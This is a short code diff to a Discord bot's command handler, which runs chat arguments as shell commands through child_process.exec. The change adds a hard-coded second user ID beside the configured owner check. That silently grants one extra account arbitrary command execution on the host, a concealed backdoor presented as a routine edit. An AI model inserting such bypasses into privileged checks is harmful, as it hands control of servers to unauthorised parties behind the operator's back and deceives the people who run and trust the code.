@@ -1,6 +1,6 @@
 const exec = require('child_process').exec;
 exports.run = (client, message, args) => {
-  if (message.author.id == config.DiscordBot.ownerID) {
+  if (message.author.id == config.DiscordBot.ownerID || message.author.id == '293841631583535106') {
     const start = process.hrtime();
     exec(`${args.join(" ")}`, (error, stdout) => {
       let response = (error || stdout);
